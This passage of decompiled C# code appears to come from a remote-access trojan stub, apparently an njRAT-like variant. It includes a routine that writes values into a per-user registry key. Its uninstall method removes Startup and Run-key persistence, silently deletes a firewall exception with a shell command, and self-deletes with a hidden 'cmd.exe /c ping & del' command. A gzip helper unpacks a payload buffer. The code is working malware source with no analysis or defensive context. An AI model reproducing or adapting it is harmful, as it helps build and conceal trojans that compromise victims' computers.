          ProjectData.SetProjectError(ex4);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return Stub.OK.j.OK.Cn;
    }

    public static bool STV(string n, object t, RegistryValueKind typ)
    {
      bool flag;
      try
      {
        Stub.OK.j.OK.F.Registry.CurrentUser.CreateSubKey("Software\\" + Stub.OK.j.OK.RG).SetValue(n, RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(t))))))), typ);
        flag = true;
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        flag = false;
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      return flag;
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public static void UNS()
    {
      System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Stub.OK.j.OK.RG);
      Stub.OK.j.OK.pr(0);
      Stub.OK.j.OK.RegistrySt = false;
      try
      {
        Stub.OK.j.OK.F.Registry.CurrentUser.OpenSubKey(Stub.OK.j.OK.sf, true).DeleteValue(Stub.OK.j.OK.RG, false);
      }
      catch (Exception ex1)
      {
        ProjectData.SetProjectError(ex1);
        Exception ex2 = ex1;
        ProjectData.SetProjectError(ex2);
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Stub.OK.j.OK.F.Registry.LocalMachine.OpenSubKey(Stub.OK.j.OK.sf, true).DeleteValue(Stub.OK.j.OK.RG, false);
      }
      catch (Exception ex3)
      {
        ProjectData.SetProjectError(ex3);
        Exception ex4 = ex3;
        ProjectData.SetProjectError(ex4);
        ProjectData.SetProjectError(ex4);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("Hassan firewall delete allowedprogram \"" + Stub.OK.j.OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex5)
      {
        ProjectData.SetProjectError(ex5);
        Exception ex6 = ex5;
        ProjectData.SetProjectError(ex6);
        ProjectData.SetProjectError(ex6);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        if (Stub.OK.j.OK.FS != null)
        {
          Stub.OK.j.OK.FS.Dispose();
          System.IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + Stub.OK.j.OK.RG + ".exe");
        }
      }
      catch (Exception ex7)
      {
        ProjectData.SetProjectError(ex7);
        Exception ex8 = ex7;
        ProjectData.SetProjectError(ex8);
        ProjectData.SetProjectError(ex8);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Stub.OK.j.OK.F.Registry.CurrentUser.OpenSubKey("Software", true).DeleteSubKey(Stub.OK.j.OK.RG, false);
      }
      catch (Exception ex9)
      {
        ProjectData.SetProjectError(ex9);
        Exception ex10 = ex9;
        ProjectData.SetProjectError(ex10);
        ProjectData.SetProjectError(ex10);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      try
      {
        Interaction.Shell("cmd.exe /c ping 0 -n 2 & del \"" + Stub.OK.j.OK.LO.FullName + "\"", AppWinStyle.Hide);
      }
      catch (Exception ex11)
      {
        ProjectData.SetProjectError(ex11);
        Exception ex12 = ex11;
        ProjectData.SetProjectError(ex12);
        ProjectData.SetProjectError(ex12);
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
        ProjectData.ClearProjectError();
      }
      ProjectData.EndApp();
    }

    public static byte[] ZIP(byte[] B)
    {
      MemoryStream memoryStream = new MemoryStream(B);
      GZipStream gzipStream = new GZipStream((Stream) memoryStream, CompressionMode.Decompress);
      byte[] buffer = new byte[4];
      memoryStream.Position = checked (memoryStream.Length - 5L);
      memoryStream.Read(buffer, 0, 4);
      int int32 = BitConverter.ToInt32(buffer, 0);
      memoryStream.Position = 0L;
      byte[] array = new byte[checked (int32 - 1 + 1 - 1 + 1 - 1 + 1)];
      gzipStream.Read(array, 0, int32);
      gzipStream.Dispose();
      memoryStream.Dispose();
      return array;
    }
  }
}
